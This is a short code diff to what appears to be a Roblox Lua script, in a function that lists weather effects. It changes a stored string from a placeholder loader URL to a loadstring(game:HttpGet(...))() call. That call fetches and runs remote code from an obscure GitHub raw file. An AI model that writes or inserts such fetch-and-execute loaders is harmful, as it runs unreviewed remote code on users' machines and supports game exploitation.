@@ -25,7 +25,7 @@ local function getWeatherList()
 end
 
 local this_thing=[[
-	loadstring(game:HttpGet("https://yourdomain.com/loader.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/x7v8p3m2q9l0/angry-thingz/refs/heads/main/feau.luau"))()
 ]]
 
 --AuroraBorealis Blizzard CosmicShower Default Eruption Gravebound Rain Sandstorm Snowy Thunderstorm Underwater Valentines
